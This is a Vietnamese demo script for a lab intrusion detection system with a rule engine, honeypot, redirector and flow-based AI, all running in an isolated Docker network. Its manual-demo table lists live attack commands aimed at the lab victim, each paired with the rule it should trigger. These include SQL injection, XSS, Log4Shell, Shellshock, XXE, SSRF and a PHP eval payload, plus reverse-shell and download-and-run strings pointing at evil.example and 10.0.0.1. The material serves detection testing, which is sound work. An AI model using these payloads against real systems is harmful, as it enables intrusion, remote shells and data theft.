# Kịch bản demo

Kịch bản trình diễn toàn bộ hệ thống trên Docker lab, khoảng 15–20 phút. Mạng cô lập `172.28.0.0/16`:

| Máy | Địa chỉ |
|---|---|
| Victim (nginx, sshd, honeypot 2222/8080) | `172.28.0.50` |
| Attacker (Kali) | `172.28.0.100` |
| API và dashboard | `172.28.0.20`, http://localhost:8000/ |
| MySQL / Redis | `172.28.0.10` / `172.28.0.30` |

## 1. Chuẩn bị

Làm từ hôm trước, không làm sát giờ:

1. Mở Docker Desktop, chờ "Engine running". Build sẵn: `docker compose build`.
2. `docker compose --profile lab up -d` (profile `lab` bật máy attacker), đợi khoảng 30 giây cho MySQL sẵn sàng.
3. `docker logs nids_engine` phải có dòng `Đã nạp ... rule` và `Lắng nghe trực tiếp`.
4. Mở dashboard, góc trên phải báo "Đã kết nối" (WebSocket qua Redis). Bấm **Xoá dữ liệu**.
5. Đặt hai cửa sổ cạnh nhau: terminal `docker logs -f nids_engine` và trình duyệt.
6. Kiểm tra nhanh cả chuỗi: `docker exec -it nids_attacker python lab/attacker/attack_demo.py web --delay 0.2`, thấy cảnh báo hiện lên rồi bấm **Xoá dữ liệu**.
7. Cho phần AI (không cần Docker): `pip install -r requirements-dev.txt`, chạy thử `python -m tools.ai.demo_ai --scenario scan` một lần (khoảng 10 giây).

## 2. Trình tự

| Phần | Thời gian | Nội dung |
|---|---|---|
| 1. Kiến trúc | 2 phút | Sơ đồ ở [system-architecture.md](system-architecture.md) |
| 2. Rule engine | 5 phút | Mục 3 |
| 3. Honeypot và chuyển hướng | 4 phút | Mục 4 |
| 4. AI theo flow | 4 phút | Mục 5 |
| 5. Hỏi đáp | còn lại | Mục 8 |

Nếu hết giờ thì chạy một lệnh duy nhất: `docker exec -it nids_attacker python lab/attacker/attack_demo.py all --delay 0.5`.

## 3. Rule engine và phát hiện bất thường

Mỗi lệnh `attack_demo.py` nghỉ 1,5 giây giữa các đòn để khán giả theo dõi kịp (đổi bằng `--delay`). Lệnh dạng `... attack_demo.py <nhóm>` là viết tắt của `docker exec -it nids_attacker python lab/attacker/attack_demo.py <nhóm>`.

| Bước | Nói gì | Lệnh | Kết quả mong đợi |
|---|---|---|---|
| 1. Bình thường | Truy cập victim bình thường thì không có cảnh báo | `docker exec -it nids_attacker curl -s -o /dev/null -w "%{http_code}\n" http://172.28.0.50/` | In `200`, dashboard vẫn 0 cảnh báo |
| 2. Tấn công web | SQLi, XSS, traversal, Log4Shell, XXE, SSRF đi qua HTTP thật | `... attack_demo.py web` | Mỗi đòn một dòng log có màu, SID khớp "kỳ vọng SID" của attacker |
| 3. Quét mạng | Nmap Xmas/Null/FIN, quét cổng SYN dựa trên cờ TCP | `... attack_demo.py scan` | SID 1000100–1000107 |
| 4. DoS | Rule dùng `detection_filter` (đếm trong cửa sổ thời gian), một gói đơn lẻ không bắn | `... attack_demo.py dos` | Chỉ bắn sau ngưỡng; threshold chặn bão cảnh báo |
| 5. Brute force, mã độc | SSH/FTP/web brute force, reverse shell, Mimikatz, cryptominer | `... attack_demo.py auth`, rồi `malware` | SID 10003xx, 10004xx |
| 6. Recon | SNMP, DNS tunneling/AXFR, ICMP, NetBIOS, SSDP | `... attack_demo.py recon` | SID 10005xx |
| 7. Tấn công chưa có rule | Quét chậm 8 cổng/giây chỉ có khoảng 16 SYN mỗi 2 giây, dưới ngưỡng rule 1000107 (> 20 SYN/2 giây), nhưng một nguồn chạm ≥ 15 cổng trong 5 giây là bất thường | `docker exec -it nids_attacker nmap -sS -p 1000-1030 --max-rate 8 172.28.0.50` | Logs, tab Anomaly: một dòng `ANOMALY Port scan` (P2, không có SID), popup có danh sách cổng. Trang Traffic, tab "Chưa khớp rule", cho thấy traffic này |
| 8. Tổng kết | Tổng cảnh báo theo P1/P2/P3, top loại tấn công; mở `/docs` cho thấy API | http://localhost:8000/docs | |

## 4. Honeypot và chuyển hướng

Bấm **Xoá dữ liệu** trước phần này.

### 4.1 Honeypot ghi hành vi

```bash
docker exec -it nids_attacker bash
ssh -p 2222 -o StrictHostKeyChecking=no root@172.28.0.50       # mật khẩu bất kỳ; gõ whoami, ls, wget http://evil.example/a.sh, exit
hydra -l root -p 123456 -t 4 -s 2222 ssh://172.28.0.50
curl -s -A "sqlmap/1.8" -d "username=admin' or 1=1--&password=x" http://172.28.0.50:8080/wp-admin-login
```

| Kỳ vọng | Ở đâu |
|---|---|
| Phiên SSH vừa rồi là **một dòng** (`Phiên SSH`, kèm số sự kiện). Popup: tab Hoạt động liệt kê đăng nhập và từng lệnh theo thứ tự; tab Raw log có HASSH và tên công cụ | `/logs`, tab Honeypot SSH |
| `ssh.bruteforce` (P2) sau khi hydra thử đủ 5 lần | `/logs`, tab Honeypot SSH |
| `http.login` có SQL injection là **P1** | `/logs`, tab Honeypot HTTP |

### 4.2 Làm giàu cảnh báo

```bash
curl -s -o /dev/null "http://172.28.0.50/.git/config"           # SID 1000043, bình thường là P2
```

- Chạy lệnh này **trước** khi chạm honeypot: cảnh báo là P2.
- Chạy lại **sau** khi chạm honeypot: cảnh báo là **P1** và có `[honeypot-confirmed]`, dòng log trong terminal engine màu đỏ.
- Danh sách IP honeypot làm mới mỗi 5 giây. Chưa thấy nhãn thì đợi vài giây rồi gửi lại.

### 4.3 Chuyển hướng sang honeypot

1. **Trước khi tấn công:** `docker exec nids_attacker nc -w 3 172.28.0.50 22` in banner OpenSSH Debian của victim; `docker exec nids_attacker curl -s http://172.28.0.50/` trả trang nginx.
2. **Tấn công:** `docker exec -it nids_attacker python lab/attacker/attack_demo.py web`. Sau vài giây, `curl http://localhost:8000/api/redirects/` có `172.28.0.100`, và `docker logs nids_redirector` có dòng "Chuyển hướng 172.28.0.100 sang honeypot".
3. **Lặp lại hai lệnh ở bước 1:** `nc` giờ in banner `SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13` của honeypot; `curl` trả trang đăng nhập WordPress giả.
4. Sau 10 phút (`redirect.ttl_seconds`), IP tự được gỡ. Chỉ kết nối **mới** bị chuyển hướng.

## 5. AI theo flow

Phần này chạy script ngoài engine, vì mô hình chưa được gắn vào engine. Chỉ cần Python.

| Demo | Lệnh | Kết quả thật |
|---|---|---|
| 1. Quét cổng | `python -m tools.ai.demo_ai --scenario scan` | Kẻ quét 15.980/16.001 flow bị báo; 3 người duyệt web 0 flow; người gõ nhầm cổng 0/3 flow, dù flow giống hệt flow quét |
| 2. Quét chậm | `python -m tools.ai.demo_ai --scenario scan --slow 100` | 543/560 flow bị báo (97%) |
| 3. Giới hạn | `python -m tools.ai.demo_ai --scenario scan --slow 1600` | Quét 0,5 flow/giây: chỉ 10/35 flow bị báo. Đây là lý do vẫn cần lớp ngưỡng và rule |
| 4. Dữ liệu thật (tuỳ chọn) | `python -m tools.ai.demo_ai --pcap <chunk CIC-IDS2017 thứ Sáu> --limit 300000` | Chỉ báo 5 máy nhiễm botnet và máy quét `172.16.0.1`; các máy còn lại không bị báo nhầm |

Lời dẫn gợi ý:

> "Rule bắt thứ đã biết mặt, AI bắt thứ có dáng điệu lạ. Từng kết nối của kẻ quét đều vô hại; chỉ khi thấy một máy gõ hàng trăm cổng trong vài giây mới biết là quét. Vì vậy người gõ nhầm cổng và kẻ quét có flow giống hệt nhau, nhưng AI chỉ báo kẻ quét."

Chunk ở demo 4 thuộc phần dữ liệu dùng để phát triển, nên chỉ là minh hoạ. Bằng chứng là số đo ở [machine-learning-guide.md](machine-learning-guide.md).

## 6. Demo gõ lệnh thủ công

Bảng dưới gõ trực tiếp trong container attacker (`docker exec -it nids_attacker bash`), không qua `attack_demo.py`, để trình diễn từng rule bằng công cụ dòng lệnh thật (nmap, hping3, hydra, sqlmap, nikto, nc...). Target victim: `172.28.0.50`. Các lệnh dùng ký tự đặc biệt (`$`, `'`, dấu cách) nên gõ đúng dấu nháy như trong bảng. Lệnh flood/brute force (hping3 --flood, hydra) chạy vô thời hạn: để vài giây cho đủ ngưỡng `detection_filter` rồi Ctrl+C, tránh làm đầy hàng đợi engine. Cổng 53 (DNS) và các dịch vụ UDP khác (NTP, SNMP, memcached) không có server thật lắng nghe trong môi trường này: gói UDP/TCP vẫn được gửi đi và rule vẫn bắn vì chỉ cần gói tới, không cần phản hồi.

| Nhóm | Lệnh | SID kỳ vọng |
|---|---|---|
| Bình thường | `curl http://172.28.0.50/` | — |
| Bình thường | `ping -c 2 172.28.0.50` | — |
| Ping/ICMP | `ping -c 1 -s 1000 172.28.0.50` (ICMP lớn, Ping of Death) | 1000203 |
| Ping/ICMP | `hping3 --icmp -C 13 -c 1 172.28.0.50` (ICMP Timestamp) | 1000503 |
| Ping/ICMP | `hping3 --icmp -C 17 -c 1 172.28.0.50` (ICMP Address Mask) | 1000504 |
| Nmap quét cờ | `nmap -sX -p 80 172.28.0.50` (Xmas scan) | 1000100 |
| Nmap quét cờ | `nmap -sN -p 80 172.28.0.50` (Null scan) | 1000101 |
| Nmap quét cờ | `nmap -sF -p 80 172.28.0.50` (FIN scan) | 1000102 |
| Nmap quét cờ | `hping3 -S -F -p 80 -c 1 172.28.0.50` (SYN+FIN) | 1000103 |
| Nmap quét cờ | `hping3 -S -R -p 80 -c 1 172.28.0.50` (SYN+RST) | 1000104 |
| Nmap quét cổng | `nmap -sS -p 1-100 172.28.0.50` (SYN scan nhiều cổng) | 1000107 |
| Nmap quét cổng | `nmap -p 80 --script http-title 172.28.0.50` (User-Agent NSE mặc định) | 1000105 |
| Nmap quét cổng | `masscan -p80 --banners 172.28.0.50/32` (User-Agent masscan) | 1000106 |
| UDP/recon | `snmpget -v1 -c public -t 1 -r 0 172.28.0.50 1.3.6.1.2.1.1.1.0` | 1000501 |
| UDP/recon | `dig @172.28.0.50 data.c2tunnel.evil.example` (chưa có DNS server, chỉ cần gói UDP tới) | 1000502 |
| UDP/recon | `dig @172.28.0.50 version.bind CH TXT` | 1000508 |
| UDP/recon | `echo -n "DNS Query" \| nc -u -w1 172.28.0.50 53` (gói 9 byte, ngắn hơn header DNS) | 1000509 |
| UDP/recon | `dig @172.28.0.50 example.com AXFR +tcp` | 1000506 |
| Flood (hping3) | `hping3 -S -p 80 --flood 172.28.0.50` rồi Ctrl+C sau 2–3 giây | 1000201 |
| Flood (hping3) | `hping3 --udp -p 9999 --flood 172.28.0.50` rồi Ctrl+C sau 2–3 giây | 1000205 |
| Flood (hping3) | `hping3 --icmp --flood 172.28.0.50` rồi Ctrl+C sau 2–3 giây | 1000206 |
| FTP/SSH | `ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=3 root@172.28.0.50` | 1000301 |
| FTP/SSH | `hydra -l root -x 3:3:a -t 4 ssh://172.28.0.50` rồi Ctrl+C sau vài giây | 1000305 |
| FTP/SSH | `printf 'user anonymous anonymous\r\nquit\r\n' \| ftp -n 172.28.0.50` | 1000302 |
| FTP/SSH | `hydra -l ftpuser -x 3:3:a -t 4 ftp://172.28.0.50` rồi Ctrl+C sau vài giây | 1000307 |
| Web | `curl "http://172.28.0.50/search?q=1'+union+select+username,password+from+users--"` | 1000001, 1000003 |
| Web | `curl "http://172.28.0.50/login?user=admin'+or+1=1"` | 1000002 |
| Web | `curl "http://172.28.0.50/item?id=1+and+sleep(5)"` | 1000031 |
| Web | `curl "http://172.28.0.50/item?id=1+union+select+table_name+from+information_schema.tables"` | 1000032 |
| Web | `curl "http://172.28.0.50/item?id=1;drop+table+users"` | 1000033 |
| Web | `curl 'http://172.28.0.50/comment?text=<script>alert(1)</script>'` | 1000010 |
| Web | `curl 'http://172.28.0.50/redirect?u=javascript:alert(1)'` | 1000011 |
| Web | `curl --data 'text=<img src=x onerror=alert(1)>' http://172.28.0.50/comment` | 1000012 |
| Web | `curl 'http://172.28.0.50/q?x=document.cookie'` | 1000034 |
| Web | `curl 'http://172.28.0.50/q?x=<iframe src=//evil.example>'` | 1000035 |
| Web | `curl 'http://172.28.0.50/download?file=../../../../etc/passwd'` | 1000020, 1000021 |
| Web | `curl 'http://172.28.0.50/download?file=%2e%2e%2f%2e%2e%2fetc'` | 1000036 |
| Web | `curl 'http://172.28.0.50/download?file=C:/windows/win.ini'` | 1000022 |
| Web | `curl 'http://172.28.0.50/index.php?page=php://filter/convert.base64-encode/resource=config'` | 1000037 |
| Web | `curl 'http://172.28.0.50/index.php?page=http://evil.example/shell.txt'` | 1000038 |
| Web | `curl 'http://172.28.0.50/ping?host=127.0.0.1|id'` | 1000030 |
| Web | `curl -H 'X-Api-Version: ${jndi:ldap://evil.example/a}' http://172.28.0.50/` | 1000039 |
| Web | `curl -A '() { :;}; echo vulnerable' http://172.28.0.50/cgi-bin/status` | 1000040 |
| Web | `curl --data '<?xml version="1.0"?><!DOCTYPE f [<!ENTITY x SYSTEM "file:///etc/hosts">]><f>&x;</f>' http://172.28.0.50/xml` | 1000041 |
| Web | `curl 'http://172.28.0.50/fetch?url=http://169.254.169.254/latest/meta-data/'` | 1000042 |
| Web | `curl http://172.28.0.50/.git/config` | 1000043 |
| Web | `curl http://172.28.0.50/.env` | 1000044 |
| Web | `curl --data "cmd=eval(base64_decode('c3lzdGVtKCRfR0VUWydjJ10pOw=='))" http://172.28.0.50/upload.php` | 1000401 |
| Web | `sqlmap -u "http://172.28.0.50/item?id=1" --batch` (User-Agent sqlmap) | 1000404 |
| Web | `nikto -h http://172.28.0.50` (User-Agent Nikto) | 1000405 |
| Web | `curl -H 'X-a: b' http://172.28.0.50/` (Slowloris header probe) | 1000202 |
| Web | `curl -u admin:admin http://172.28.0.50/admin` | 1000303 |
| Web | `curl --data 'user=admin&pass=admin' http://172.28.0.50/admin/login` | 1000304 |
| Web | `for i in 1 2 3 4 5 6; do curl -s -o /dev/null --data "user=admin&pass=guess$i" http://172.28.0.50/login; done` | 1000306 |
| Web | `for i in $(seq 1 40); do curl -s -o /dev/null http://172.28.0.50/; done` (HTTP GET flood) | 1000209 |
| Payload qua nc (4444/3333) | `echo "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" \| nc -q 1 172.28.0.50 4444` | 1000402 |
| Payload qua nc (4444/3333) | `echo "powershell -c (New-Object Net.WebClient).DownloadString('http://evil.example/x.ps1')" \| nc -q 1 172.28.0.50 4444` | 1000403 |
| Payload qua nc (4444/3333) | `echo "nc 10.0.0.1 4444 -e /bin/sh" \| nc -q 1 172.28.0.50 4444` | 1000406 |
| Payload qua nc (4444/3333) | `echo "wget http://evil.example/x.sh -O /tmp/x.sh" \| nc -q 1 172.28.0.50 4444` | 1000407 |
| Payload qua nc (4444/3333) | `echo 'import subprocess;subprocess.call(["/bin/sh","-i"])' \| nc -q 1 172.28.0.50 4444` | 1000408 |
| Payload qua nc (4444/3333) | `echo "mimikatz # sekurlsa::logonpasswords" \| nc -q 1 172.28.0.50 4444` | 1000409 |
| Payload qua nc (4444/3333) | `echo 'X5O...EICAR-STANDARD-ANTIVIRUS-TEST-FILE...' \| nc -q 1 172.28.0.50 4444` | 1000410 |
| Payload qua nc (4444/3333) | `echo '{"id":1,"method":"mining.subscribe","params":[]}' \| nc -q 1 172.28.0.50 3333` | 1000411 |

5 rule UDP đòi hỏi byte nhị phân chính xác (NTP monlist 1000204, DNS ANY 1000207, Memcached stats 1000208, NetBIOS 1000505, SSDP 1000507) không có lệnh dòng lệnh thủ công tương đương gọn gàng; chúng vẫn được trình diễn qua `lab/attacker/attack_demo.py dos` và `... recon`.

## 7. Phương án dự phòng

| Sự cố | Xử lý |
|---|---|
| Dashboard trống dù đã tấn công | `docker logs nids_engine` có cảnh báo không? Có mà dashboard trống thì lỗi nằm ở MySQL hoặc API. Kiểm tra `docker compose ps` và `curl http://localhost:8000/health` |
| Engine báo không lưu được vào CSDL | MySQL khởi động chậm; đợi thêm rồi `docker compose restart nids_engine` |
| Dashboard không cập nhật tức thì | Redis tắt; dashboard tự poll mỗi 2 giây, vẫn demo được |
| Chưa thấy `[honeypot-confirmed]` | Cache IP honeypot làm mới mỗi 5 giây; gửi lại đòn |

## 8. Câu hỏi thường gặp

**Vì sao dùng Aho-Corasick?**
Mỗi gói cần tìm hàng chục đến hàng nghìn chuỗi. Aho-Corasick tìm mọi mẫu trong một lần duyệt payload, chi phí tuyến tính theo độ dài gói và không phụ thuộc số rule. Chỉ rule có mẫu xuất hiện mới được kiểm tra chi tiết.

**Khác gì Snort thật?**
Rule dùng cú pháp Snort 3, nhưng engine chỉ hiểu một tập con option. Tái hợp TCP mới làm cho chiều client → server. `flow:established` được xấp xỉ bằng cờ ACK. Chi tiết: [detection-engine.md](detection-engine.md).

**Có báo nhầm không?**
Có. Trên traffic thật của CIC-IDS2017, các rule ngưỡng và lớp ANOMALY báo nhầm nhiều ([performance-metrics.md](performance-metrics.md)). Mỗi rule tự viết đều có test gói tấn công và gói lành tính gần giống. Rule tần suất dùng `detection_filter` để một gói hợp lệ đơn lẻ không gây cảnh báo.

**Bộ rule lấy từ đâu?**
68 rule tự viết chia theo nhóm SID, cộng khoảng 2.800 rule Snort Community được chuyển sang Snort 3 bằng công cụ của nhóm.

**Thêm rule mới thế nào?**
Rule built-in thêm vào file của nhóm trong `data/rules/`. Rule tạm viết trong `custom.rules` ngay trên trang Rules. Engine tự nạp lại sau vài giây.

**Hiệu năng và rớt gói?**
Thread capture đẩy gói vào queue có giới hạn, worker xử lý ở thread riêng. Ở chế độ live, queue đầy thì bỏ gói và log tổng số gói bị bỏ. Đọc pcap thì không bỏ gói nào. Tốc độ khoảng 2.700–3.200 gói/giây.

**AI có thay được Snort không?**
Không. Tấn công web khác ở nội dung, nên AI để phần đó cho Snort. Snort lại không nhìn được "một máy gõ hàng trăm cổng". Ba lớp (rule, ngưỡng, AI) bổ sung cho nhau.

**Làm sao biết AI không học thuộc lòng?**
Dữ liệu chia theo khối 5 phút: khối dùng để chấm không có trong phần học. Mô hình được chấm theo 4 cách chia, chạy lại cho ra đúng một kết quả, và còn một tập thi chưa mở. Mô hình cũng không dùng IP làm đặc trưng.

**Vì sao không dùng học sâu?**
Dữ liệu dạng bảng; Random Forest nhẹ (2,9 MB), nhanh và giải thích được bằng feature importance.

**AI đã chạy trong engine chưa?**
Chưa. Mô hình đã huấn luyện và đánh giá xong; demo chạy script ngoài engine. Bước còn lại là cho `AITrafficWorker` nạp mô hình và sinh cảnh báo `AI_ENGINE`.
